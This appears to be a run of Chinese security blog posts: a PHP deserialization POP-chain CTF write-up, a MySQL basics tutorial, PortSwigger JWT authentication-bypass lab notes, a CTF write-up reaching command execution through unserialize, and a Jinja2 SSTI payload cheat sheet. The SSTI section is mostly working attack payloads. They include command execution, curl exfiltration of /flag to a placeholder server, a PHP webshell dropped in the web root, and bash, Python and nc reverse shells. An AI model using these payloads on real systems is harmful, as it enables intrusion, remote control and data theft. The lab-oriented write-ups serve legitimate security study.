entry.content:
题目源码&lt;?phperror_reporting(0);class User &#123; public $profile; public function __destruct() &#123; echo $this-&gt;profile; &#125;&#125;class Profile &#123; public $name; public $helper; public function __toString() &#123; $this-&gt;helper-&gt;run($this-&gt;name); return &quot;guest&quot;; &#125;&#125;class Helper &#123; public $callback; public function run($data) &#123; $fn = $this-&gt;callback; return $fn($data); &#125;&#125;class Invoker &#123; public $target; public function __invoke($cmd) &#123; return $this-&gt;target-&gt;execute($cmd); &#125;&#125;class Executor &#123; public $handler; public function execute($cmd) &#123; return $this-&gt;handler-&gt;process($cmd); &#125;&#125;class Processor &#123; public $func; public function process($cmd) &#123; $f = $this-&gt;func; return $f($cmd); &#125;&#125;class FileReader &#123; public function read($file) &#123; return include($file); &#125;&#125;class DynamicCall &#123; public $obj; public function __call($name, $args) &#123; return $this-&gt;obj-&gt;read($args[0]); &#125;&#125;if (isset($_POST[&#x27;data&#x27;])) &#123; $data = $_POST[&#x27;data&#x27;]; unserialize($data); echo &quot;\nDone&quot;;&#125; else &#123; highlight_file(__FILE__);&#125;?&gt;
入口点：unserialize($_POST[&#39;data&#39;])
魔术方法分析
魔术方法 所在类 触发条件
__destruct() User 对象被销毁时
__toString() Profile 对象被当作字符串时（echo）
__invoke() Invoker 对象被当作函数调用时
__call() DynamicCall 调用对象上不存在的方法时
POP链构造思路Step 1: 起点 — __destructclass User &#123; public $profile; public function __destruct() &#123; echo $this-&gt;profile; // profile 是 Profile 对象 → 触发 __toString &#125;&#125;
unserialize() 结束后，$user 对象被销毁，触发 __destruct()。其中 echo $this-&gt;profile 把 profile 属性当字符串输出，如果 profile 是一个 Profile 对象，则触发它的 __toString()。 Step 2: __toString → 调用 helper-&gt;run()class Profile &#123; public $name; public $helper; public function __toString() &#123; $this-&gt;helper-&gt;run($this-&gt;name); // helper = Helper 对象 return &quot;guest&quot;; &#125;&#125;
Profile::__toString() 调用 $this-&gt;helper-&gt;run($this-&gt;name)，这里 helper 是一个 Helper 对象，name 是要读取的文件路径。 Step 3: Helper::run → 回调函数调用 → __invokeclass Helper &#123; public $callback; public function run($data) &#123; $fn = $this-&gt;callback; // callback = Invoker 对象 return $fn($data); // 把对象当函数调用 → 触发 __invoke &#125;&#125;
Helper::run() 取出 $this-&gt;callback 赋值给 $fn，然后 $fn($data) 把 $fn 当作函数调用。如果 $fn 是一个 Invoker 对象，则触发 Invoker::__invoke($data)。 这里传入的 $data 就是文件路径字符串。 Step 4: __invoke → 调用 target-&gt;execute()class Invoker &#123; public $target; public function __invoke($cmd) &#123; return $this-&gt;target-&gt;execute($cmd); // target = Executor 对象 &#125;&#125;
Invoker::__invoke($cmd) 调用 $this-&gt;target-&gt;execute($cmd)，target 是一个 Executor 对象。 Step 5: Executor::execute → 调用 handler-&gt;process()class Executor &#123; public $handler; public function execute($cmd) &#123; return $this-&gt;handler-&gt;process($cmd); // handler = Processor 对象 &#125;&#125;
Executor::execute($cmd) 调用 $this-&gt;handler-&gt;process($cmd)，handler 是一个 Processor 对象。 Step 6: Processor::process → callable 数组 → __callclass Processor &#123; public $func; public function process($cmd) &#123; $f = $this-&gt;func; // func = [DynamicCall对象, &#x27;p&#x27;] return $f($cmd); // 触发 DynamicCall::__call(&#x27;p&#x27;, [$cmd]) &#125;&#125;
关键点来了： $this-&gt;func 被设为 [$d, &#39;p&#39;]，这是一个 PHP callable 数组。$f($cmd) 等价于调用 $d-&gt;p($cmd)。 由于 DynamicCall 类没有 p() 这个方法，PHP 会触发 __call(&#39;p&#39;, [$cmd])。 Step 7: __call → 调用 obj-&gt;read() → 文件包含class DynamicCall &#123; public $obj; public function __call($name, $args) &#123; return $this-&gt;obj-&gt;read($args[0]); // obj = FileReader, $args[0] = 文件路径 &#125;&#125;class FileReader &#123; public function read($file) &#123; return include($file); // PHP伪协议读取文件 &#125;&#125;
__call($name, $args) 中：
$name &#x3D; &#39;p&#39;（调用的方法名，这里不重要） $args[0] &#x3D; 文件路径字符串（从 Profile::$name 一路传过来的）
$this-&gt;obj 是 FileReader 对象，所以调用 FileReader::read($args[0]) → include($file)，完成文件包含。 完整的POP链User::__destruct() → echo $this-&gt;profile → Profile::__toString() → $this-&gt;helper-&gt;run($this-&gt;name) → Helper::run() → $fn = $this-&gt;callback; $fn($data) // $fn 是 Invoker，触发 __invoke → Invoker::__invoke($cmd) → $this-&gt;target-&gt;execute($cmd) // target 是 Executor → Executor::execute($cmd) → $this-&gt;handler-&gt;process($cmd) // handler 是 Processor → Processor::process($cmd) → $f = $this-&gt;func; $f($cmd) // $f = [$d, &#x27;p&#x27;]，触发 __call → DynamicCall::__call(&#x27;p&#x27;, [$cmd]) → $this-&gt;obj-&gt;read($args[0]) // obj 是 FileReader → FileReader::read($file) → include($file) // 文件包含！
关键技巧：PHP Callable 数组触发 __callPHP 中，[$object, &#39;methodName&#39;] 是一个合法的 callable 类型。当你执行： $obj = new DynamicCall();$callback = [$obj, &#x27;hello&#x27;];$callback(&#x27;world&#x27;);
PHP 会尝试调用 $obj-&gt;hello(&#39;world&#39;)，如果 hello() 方法不存在，就会触发： public function __call($name, $args) &#123; // $name = &#x27;hello&#x27; // $args = [&#x27;world&#x27;]&#125;
这个特性是这条 POP 链能够将 Processor 连接到 DynamicCall 的关键。Processor::process() 中的 $f($cmd) 可以是任何 callable，包括 [$obj, &#39;method&#39;] 这种形式。 构造 Payload$d = new DynamicCall();$d-&gt;obj = new FileReader();$process = new Processor();$process-&gt;func = [$d, &#x27;p&#x27;]; // callable 数组，最终触发 __call$executor = new Executor();$executor-&gt;handler = $process;$invoker = new Invoker();$invoker-&gt;target = $executor;$helper = new Helper();$helper-&gt;callback = $invoker;$profile = new Profile();$profile-&gt;helper = $helper;$profile-&gt;name = &#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;;$user = new User();$user-&gt;profile = $profile;echo serialize($user);
输出序列化数据： O:4:&quot;User&quot;:1:&#123;s:7:&quot;profile&quot;;O:7:&quot;Profile&quot;:2:&#123;s:4:&quot;name&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:6:&quot;helper&quot;;O:6:&quot;Helper&quot;:1:&#123;s:8:&quot;callback&quot;;O:7:&quot;Invoker&quot;:1:&#123;s:6:&quot;target&quot;;O:8:&quot;Executor&quot;:1:&#123;s:7:&quot;handler&quot;;O:9:&quot;Processor&quot;:1:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;O:11:&quot;DynamicCall&quot;:1:&#123;s:3:&quot;obj&quot;;O:10:&quot;FileReader&quot;:0:&#123;&#125;&#125;i:1;s:1:&quot;p&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#125;#最好url编码
发post请求： data=O:4:&quot;User&quot;:1:&#123;s:7:&quot;profile&quot;;O:7:&quot;Profile&quot;:2:&#123;s:4:&quot;name&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:6:&quot;helper&quot;;O:6:&quot;Helper&quot;:1:&#123;s:8:&quot;callback&quot;;O:7:&quot;Invoker&quot;:1:&#123;s:6:&quot;target&quot;;O:8:&quot;Executor&quot;:1:&#123;s:7:&quot;handler&quot;;O:9:&quot;Processor&quot;:1:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;O:11:&quot;DynamicCall&quot;:1:&#123;s:3:&quot;obj&quot;;O:10:&quot;FileReader&quot;:0:&#123;&#125;&#125;i:1;s:1:&quot;p&quot;;&#125;&#125;&#125;&#125;&#125;&#125;&#125;
获取 Flag返回文件文本的base64编码：
PD9waHAKZWNobyAi5L2g5Zyo5bmy5LuA5LmIIjsKJGZsYWc9ImZsYWd7dHFsdHFsdHFsfSI7Cg&#x3D;&#x3D;
Base64 解码得到 flag.php 源码： &lt;?phpecho &quot;你在干嘛呀&quot;;$flag=&quot;flag&#123;tqltqltql&#125;&quot;;
Flag: flag{tqltqltql} 总结这道题考察了以下知识点：
反序列化POP链 — 串联多个魔术方法构造利用链 [$obj, &#39;method&#39;] Callable 用法 — PHP 中数组形式的 callable 可以路由到 __call()，这是连接 Processor → DynamicCall 的关键 __call() 魔术方法 — 当调用不存在的方法时触发，接收方法名和参数数组 __invoke() 魔术方法 — 当对象被当作函数调用时触发 PHP伪协议 — php://filter/convert.base64-encode/resource= 读取 PHP 文件源码（避免 PHP 代码被执行导致看不到输出） include() 文件包含 — 利用 PHP 流包装器实现任意文件读取

一.创建数据库1. 直接创建数据库（默认字符集和排序规则）create database 数据库名;
2. 判断数据库是否存在，不存在则创建create database if not exists 数据库名;
3. 指定字符集创建数据库create database 数据库名 character set 字符集;
4. 指定字符集和排序规则创建数据库create database 数据库名 character set 字符集 collate 排序规则;
字符集种类 utf8mb3（支持中文，过时） utf8mb4（支持emoji表情，mysql8.0默认字符集）
排序规则种类 utf8mb3_general_ci（支持中文，过时） utf8mb4_general_ci（支持emoji表情，大小写敏感排序） utf8mb4_ai_ci（支持emoji表情，unicode排序,大小写和重音敏感排序,mysql8.0默认排序规则） utf8mb4_as_ci（支持emoji表情，unicode排序，大小写和重音敏感排序）
注意:创建数据库时，字符集和排序规则必须一致(utf8mb3对utf8mb3_general_ci，utf8mb4对utf8mb4_general_ci)查看数据库字符集和排序规则show variables like &#x27;character_set_database&#x27;;show variables like &#x27;collation_database&#x27;;
二.库的查看与切换1. 查看当前所有库show databases;
2. 查看当前使用库select database();
3. 查看指定库下的所有表show tables from 数据库名;
4. 查看创建库的信息show create database 数据库名;
5. 切换到指定库use 数据库名;
注意:切换库后，当前会话库会改变，后续操作会默认在切换后的库下进行。所以要操作指定库下的表和数据前，需要先切换到该库。三.库的删除与修改1. 删除数据库drop database 数据库名;
2. 判断数据库是否存在，不存在则删除drop database if exists 数据库名;
3. 修改数据库字符集alter database 数据库名 character set 字符集;
4. 修改数据库排序规则alter database 数据库名 collate 排序规则;
5. 同时修改数据库字符集和排序规则alter database 数据库名 character set 字符集 collate 排序规则;
四.表的创建1.基本格式create table [if not exists] 表名(列名 类型 [列可选约束][COMMENT&#x27;列可选注释&#x27;],列名 类型 [列可选约束][COMMENT‘列可选注释&#x27;],列名 类型 [列可选约束][COMMENT&#x27;列可选注释’],列名 类型 [列可选约束][COMMENT‘列可选注释&#x27;],#列之间使用,分割)[表可选约束][COMMENT‘表可选注释’];
2. 实例create table if not exists book_lib( book_id int primary key comment &#x27;图书id&#x27;, book_name varchar(20) comment &#x27;图书名称&#x27;, book_author varchar(20) comment &#x27;图书作者&#x27;, book_price double(4,1) comment &#x27;图书价格&#x27;)charset=utf8mb4 coll=utf8mb4_ai_ci;
介绍:创建了一个名为book_lib的表，包含图书id，图书名称，图书作者，图书价格四列，图书id为主键，图书价格为双精度浮点数，图书名称和图书作者均为varchar类型（最大长度为20个字符）。表的字符集为utf8mb4，排序规则为utf8mb4_ai_ci。五.表的数据类型1. 整数类型
类型 存储（字节） 范围
tinyint（mysql独有） 1 -128~127
smallint（sql通用） 2 -32768~32767
mediumint (mysql独有) 3 -16777216~16777215
bigint（mysql独有） 8 -2^63~2^63-1
int（sql通用） 4 -2^31~2^31-1
注意：加上unsigned后，对应列数据变成无负号整数，范围大小不变，但最小值从0开始。例：stu_age tinyint unsigned COMMENT‘年龄字段,tinyint类型,无符号值从0开始’,stu_age tinyint COMMENT‘年龄字段,tinyint类型,无符号值从-128开始&#x27;,
2. 浮点&#x2F;定点数类型
类型 存储（字节） 范围
float 4 -3^23~3^23
double 8 -3^64~3^64
stu_height float(4,1) unsigned COMMENT‘身高,保留一位小数,多位会四舍五入,无符号值从0开始’-- 比如180.66会被四舍五入为180.7
注意：从MySQL 8.0.17 开始,不推荐使用非标准FLOAT(M,D)语法DOUBLE(M,D),未来版本中可能删除对它的支持。（支持unsigned修饰,添加修饰,只保留正值范围负值不会迁移到正值!）
类型 存储(字节) M(小数+整数位数) D(小位数)
decimal(M,D) 动态计算 M最大为65 D最大为30
注意:DECIMAL类型的存储空间是可变的,它的存储大小受DECIMAL数据类型定义时指定的精度和规模影响。如果D小数位数为0,DECIMAL则值不包含小数点或小数部分。例：emp_salary DECIMAL(8,1) COMMENT ‘工资,小数加整数一共8位,保留一位小数,多位会四舍五入’
3. 字符类型
类型 特点 长度范围（字符）
char(n) 固定长度 0&#x3D;&lt;n&lt;&#x3D;255
varchar(n) 可变长度 0&#x3D;&lt;n&lt;&#x3D;65535
text 长文本 0~65535
tinytext 微短文本 0~255
tinyblob 微短二进制文本 0~255
blob 二进制文本 0~65535
注意: varchar定义时，必须指定最大长度，否则会报错。char定义时，如果不指定最大长度，默认会指定最大长度为1。 字符类型在存储时，如果数据长度小于最大长度，会在末尾填充空格。 blob类型是一个二进制大对象，可以容纳可变数量的数据。
4. 日期和时间类型
类型 大小（bytes） 格式 范围 用途
date 3 YYYY-MM-DD 1000-01-01~9999-12-31 日期值
time 3 HH:mm:ss -838:59:59~838:59:59 时间值
datetime 8 YYYY-MM-DD HH:mm:ss 1000-01-01 00:00:00 到 9999-12-31 23:59:59 日期时间值混合
year 1 YYYY 1901~2155 年分值
timestamp 4 YYYY-DD HH:mm:ss 1970-01-01 00:00:00 到 2038-01-19 03:14:07 年分值
注意: year类型有两位或者四位的表达形式,两位 00-69 &#x3D;2000-2069 70-99&#x3D;1970-1999 时间类型就是一个特殊格式的字符串,插入数据的时候!,时间类型需要自动赋值,需要手动添加相关的设置
扩展自动填写时间: 插入默认添加时间
datetime default current_timestamp ;
修改默认更改时间(插入的默认时间)
datetime default current_timestamp on update current_timestamp; 实例：ACREATE TABLE t2(NAME VARCHAR (20),register_time DATETIME DEFAULT CURRENT_TIMESTAMP COMMENT&#x27;插入自动维护时间&#x27;,update_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &#x27;插入维护时间,修改数据自动维护时间&#x27;)
创建t2表:注册日期 字段插入自动添加时间,更新数据不变(插入数据的时候,自动维护时间,后续修改数据,时间不变!)更新日期 字段插入自动添加时间,更新数据时间改变(插入数据需要自动维护时间,修改数据也需要维护时间!) 六. 表的修改和删除1. 添加列alter table 表名 add 列名 类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名]; 2. 删除列alter table 表名 drop 列名; 3. 修改列名alter table 表名 change 原列名 新列名 新类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名]; 4. 修改列类型alter table 表名 modify 列名 新类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名]; 5. 修改表名alter table 表名 rename 新表名; 6. 删除表drop table [if exists] 表名; 7. 清除表数据truncate table 表名;

一.未验证签名绕过JWT认证靶场地址:实验室：通过未验证签名绕过JWT认证 |网络安全学院 原理:由于服务器未对jwt签名进行验证,导致任何人生成的jwt都可以通过认证 靶场复现:准备工具:burpsuite加上jwt editor插件拓展 目的:伪造用户访问后台/admin,越权删除账户carlos 1.启动靶场,登录账号密码 wiener:peter,抓取带有自身jwt的数据包进行修改显示401 未授权,需要administrator用户才可以访问/admin 2.发送到repeater模块,点击Json Web Token直接修改sub的值为administrator 成功200 可以来到浏览器替换jwt访问/admin页面点击删除,也可以直接在burpsuit上修改url访问路径/admin/delete?username=carlos删除用户这里我替换好了这里直接删除就好了 二.通过有缺陷的签名验证实现JWT认证绕过靶场地址:实验：通过有缺陷的签名验证绕过JWT认证 |网络安全学院 原理:服务器允许签名算法为空,可以将签名算法改成none,从而伪造签名 复现:1.前面的一系列登录,抓包,操作与上一个一致,只有修改签名使用的算法,改成none即可修改之后由此401变成200,可以重复上一个操作了,将有效jwt复制或者直接接口删除用户 三.通过弱签名密钥绕过JWT认证靶场地址:实验室：通过弱签名密钥绕过JWT认证 |网络安全学院 准备工具:jwt_tool工具 原理:由于签名使用对称加密,并且加密的密钥泄露或者使用的弱密码造成攻击者可以使用该密钥伪造jwt 复现: 1.登录,抓包,获取jwt 2.使用jwt_tool工具进行破解 字典在题目上给了jwt.secrets.list文件 python jwt_tool.py &lt;JWT&gt; -C -d jwt.secrets.list 成功获取了密码 3.使用jwt.io网站使用密码验证,并且修改验证修改 将右边的有效jwt复制即可,同上 四.通过JWK头注入实现JWT认证绕过靶场地址:实验：通过JWK头注入实现JWT认证绕过 |Web Security Academy 原理:JWK内嵌公钥攻击,就是jwt将公钥放在头部,攻击者通过修改头部控制 JWT 验证所使用的公钥,从而使攻击者变成了签发 JWT 的人. JWT header 允许： &#123; &quot;alg&quot;:&quot;RS256&quot;, &quot;jwk&quot;:&#123; &quot;kty&quot;:&quot;RSA&quot;, &quot;n&quot;:&quot;攻击者公钥&quot;, &quot;e&quot;:&quot;AQAB&quot; &#125; &#125;
如果服务器： 直接使用 header.jwk 验证
攻击者：
用自己私钥签名 把公钥放 header
服务器验证成功。 复现: 1.获取带有自己jwt的/admin包发送到repeater模块,使用jwt editor生成新的rsa key成功生成 2.在repeater模块,注入自己的rsa公钥 3.修改用户之后还要点一下sign进行签名 注意:如果生成过多个key的话,要选择对应的,不要选错了 4.发送数据,已经变成200,可以访问了,可以直接删除用户了 五.通过JKU头注入绕过JWT认证靶场地址:实验：通过JKU头注入绕过JWT认证 |网络安全学院 原理:与上一个类似,上一个是直接使用头部的公钥进行验证,这一个则是头部使用jku字段,加载远程的公钥字段,攻击者只需要搭建一个远程服务器构造特定的返回公钥值,就可以实现绕过认证. JWT header 支持字段： &#123; &quot;alg&quot;: &quot;RS256&quot;, &quot;jku&quot;: &quot;https://attacker.com/jwks.json&quot;, &quot;kid&quot;: &quot;hack&quot;&#125;
jku &#x3D; JSON Web Key URL含义:指定 JWKS 地址 JWKS格式: &#123; &quot;keys&quot;:[ &#123; &quot;kid&quot;:&quot;hack&quot;, &quot;kty&quot;:&quot;RSA&quot;, &quot;n&quot;:&quot;攻击者公钥&quot;, &quot;e&quot;:&quot;AQAB&quot; &#125; ] &#125;
复现:1.同上获取数据包,并且通过jwt editor生成rsa key 2.复制jwk 3.去提供的漏洞服务器,构造恶意url 将刚刚复制的jwk放进以下keys里面,构造有效jwks,并且放到返回中 &#123; &quot;keys&quot;:[ ] &#125;
添加之后 &#123; &quot;keys&quot;:[ &#123; &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;fd9a2045-9d42-4952-919a-93a1e35a56ff&quot;, &quot;n&quot;: &quot;uKtgYTLgMV3BBvLnLfcn_bSN-tRIbP_1oY7Gu3IxY51hLOSIPKiYeRbiI2fEZBmex6JJ7_YRf9SnQBIc_iyBOXNoZnUUZ5qJzPaI1O2mvmQhnXFHkcuMwneSyxQ1lok1SzeL45AalXwMwANCVqUz83VEziJrNc3fFS0RtoSYzsf3v6uJ82QsMWJ-QTZNhUibvd3BCOIh8aLL-IzFk48fRwcz3CBn0jgtNcx8OG97C6jt04vp0DYhf5ykdLBbzEb9UnM4HKVTrZXdNB2IwYMfPmwfXCoq-5cOLvC7i_mYsPdS6QmQyezTK824nvgKHA-qXO-wysFoQBlVKmJOM3avBQ&quot; &#125; ] &#125;
复制恶意url:https://exploit-0a9300cb04f1772a82f3bec4013d000e.exploit-server.net/exploit 4.回到burpsuite的repeater模块,json web token添加头部字段jku,并且将kid修改成我们刚刚生成的kid,还有administrator 5.最后sign签名,发包,成功200 六. 通过kid头路径遍历实现JWT认证绕过靶场地址:实验：通过kid头路径穿越JWT认证 |网络安全学院 原理:有些代码写成 key = open(&quot;/keys/&quot; + kid + &quot;.pem&quot;)
通过头部的kid遍历本地的签名文件来作为jwt的签名攻击者可以通过使用../../使服务器读取其他目录的文件,进行签名,然而服务器根目录/dev/null会返回空即可以使用这个来用空来验签,我们用空来签名 复现:1.一如既往登录将数据包发送到repeater,使用jwt editor 生成symmetric key 2.将k改成AA==,AA==是空的base64编码 3.回到repeater模块的json web token,将kid改成../../../../../../../dev/null,跳出到根目录的/dev/null,administrator记得修改 4.签名jwt,点Sign选择刚刚生成的key,确认 5.成功200本文章内容来源:https://www.cnblogs.com/hzhsec/p/19701592.html,仅作为个人笔记使用

访问题目地址，看到一个简单的页面，背景图，以及一段 JavaScript 代码，页面会在 5 秒后自动提交一个表单。 页面分析抓包查看源码 页面会自动提交 func=date 和 p=Y-m-d h:i:s a 两个参数，返回当前时间。这刚好和data(“Y-m-d h:i:s a”)格式一致，所以猜测func是一个函数，p是函数的参数 源码获取尝试用 highlight_file 函数读取源码： POST: func=highlight_file&amp;p=index.php
成功获取到完整源码 &lt;?php$disable_fun = array( &quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;, &quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;, &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,&quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;, &quot;filter_var&quot;,&quot;filter_var_array&quot;,&quot;uasort&quot;,&quot;uksort&quot;,&quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a = gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123; return &quot;&quot;; &#125;&#125;class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123; $func = strtolower($func); if (!in_array($func, $disable_fun)) &#123; echo gettime($func, $p); &#125; else &#123; die(&quot;Hacker...&quot;); &#125;&#125;?&gt;
代码审计漏洞点1：call_user_func 动态调用gettime() 函数使用 call_user_func($func, $p) 动态调用任意函数，仅对第一个参数 $func 做黑名单过滤。这本身就存在风险，但由于黑名单的存在，直接传 system, exec 等会被拦截。 漏洞点2：Test 类的 __destruct 魔术方法Test 类的析构方法 __destruct() 会调用 gettime($this-&gt;func, $this-&gt;p)，注意这里没有黑名单检查！ function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); // 无黑名单检查！ &#125;&#125;
漏洞点3：unserialize 不在黑名单中检查 $disable_fun 黑名单数组，发现 unserialize 函数并没有被禁用！ 利用思路 通过 unserialize 函数（不在黑名单中）触发反序列化 构造一个序列化的 Test 对象，将 $func 设为 system，$p 设为要执行的命令 对象生命周期结束时会调用 __destruct()，从而绕过黑名单执行任意命令
利用链index.php(接收func=unserialize&amp;p=序列化payload) → call_user_func(&quot;unserialize&quot;, $payload) // 反序列化，创建Test对象 → Test::__destruct() // 对象析构 → gettime($this-&gt;func, $this-&gt;p) // 绕过黑名单 → call_user_func(&quot;system&quot;, &quot;cat /tmp/flagoefiu4r93&quot;) // RCE！
解题过程第1步：确认反序列化可用先执行一个简单的 ls 命令验证反序列化RCE是否可用： POST: func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;&#125;
成功执行！目录下存在index.php和bg.jpg文件 第2步：查找flag文件使用 find 命令搜索 flag 文件： POST: func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;&#125;
找到flag路径为 /tmp/flagoefiu4r93。 第3步：读取flagPOST: func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;&#125; 成功找到flag

常用注入模块
查找所需模块对应位置（编号）
构造payload

1. 文件读取&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[79][&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)&#125;&#125;
2. 内建函数eval&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__[&quot;__builtins__&quot;][&quot;eval&quot;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&quot;)&#125;&#125;
3. os模块&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;].popen(&quot;ls -l /opt&quot;).read()&#125;&#125;
4. importlib类&#123;&#123;[].__class__.__base__.__subclasses__()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls -l /opt&quot;).read()&#125;&#125;
5. linecache函数&#123;&#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(&#x27;ls -l /&#x27;).read()&#125;&#125;
6. subprocess.Popen类&#123;&#123;[].__class__.__base__.__subclasses__()[200](&quot;ls /&quot;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;

7.利用Flask的配置对象 config&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;

8.利用Flask的url_for函数&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;
9. 利用lipsum模块读取文件lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()
SSTI绕过技巧1. 绕过过滤双大括号当服务器过滤了 &#123;&#123;` 和 `&#125;&#125; 时，可以使用 Jinja2 的 &#123;% ... %&#125; 语句块配合 print 来执行：
&#123;&#123;print(&quot;&quot;.__class__.__mro__[1].__subclasses__()[79].get_data(0,&quot;/etc/passwd&quot;))&#125;&#125;

若 print 也被过滤，可利用 if 判断做盲注：
&#123;&#123;if &quot;&quot;.__class__.__mro__[1].__subclasses__()[79].get_data(0,&quot;/etc/passwd&quot;)%&#125;yes&#123;&#123;endif&#125;&#125;

2. 无回显SSTI（Blind SSTI）当执行结果不直接回显到页面时，需要通过带外方式（OOB）获取数据：
DNSlog &#x2F; HTTP外带：
&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;curl http://your-server/$(cat /flag)&#x27;).read()&#125;&#125;

写入Web目录：
&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;echo &lt;?php system($_GET[1]);?&gt; &gt; /var/www/html/shell.php&#x27;).read()&#125;&#125;

时间盲注检测：
&#123;&#123;if &quot;&quot;.__class__.__mro__[2].__subclasses__()[79].get_data(0,&quot;/etc/passwd&quot;).startswith(&quot;root&quot;)%&#125;&#125;&#123;&#123;print(&quot;found&quot;)&#125;&#125;&#123;&#123;endif&#125;&#125;

反弹Shell：
# 攻击机监听：nc -lvnp 4444# SSTI payload - 方法一：bash反弹&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/your-ip/4444 0&gt;&amp;1&quot;&#x27;).read()&#125;&#125;# 方法二：Python反弹&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;python3 -c &quot;import os,socket,subprocess;s=socket.socket();s.connect((\&quot;your-ip\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&quot;&#x27;).read()&#125;&#125;# 方法三：nc反弹&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;nc 攻击机ip 4444 -e /bin/sh&#x27;).read()&#125;&#125;

3. getitem绕过中括号过滤当 [] 被过滤时，使用 __getitem__() 方法替代：
&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(79)&#125;&#125;

&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(199).__init__.__globals__.__getitem__(&quot;os&quot;).popen.__getitem__(&quot;read&quot;)&#125;&#125;

4. request请求绕过单双引号过滤当引号被过滤时，通过 request 对象从外部传入参数：
GET参数传递：
&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(199).__init__.__globals__.__getitem__(request.args.p).popen(request.args.cmd).read()&#125;&#125;# URL: ?p=os&amp;cmd=whoami

Cookie传递（适合参数被记录的情况）：
&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(199).__init__.__globals__.__getitem__(request.cookies.p).popen(request.cookies.cmd).read()&#125;&#125;

request.values传多参数：
&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(199).__init__.__globals__.__getitem__(request.values.a).popen(request.values.b).read()&#125;&#125;

5. 过滤器绕过下划线过滤当 _ 被过滤时，利用 attr() 过滤器配合十六进制编码绕过：
&#123;&#123;&quot;&quot;|attr(&quot;\x5f\x5fclass\x5f\x5f&quot;)|attr(&quot;\x5f\x5fbases\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(0)&#125;&#125;

其中 \x5f 是下划线 _ 的十六进制编码。
也可结合 request 传入属性名：
&#123;&#123;&quot;&quot;|attr(request.args.a)&#125;&#125;# URL: ?a=__class__

6. 中括号绕过点过滤当 . 被过滤时，完全使用 [] 加字符串来访问属性和方法：
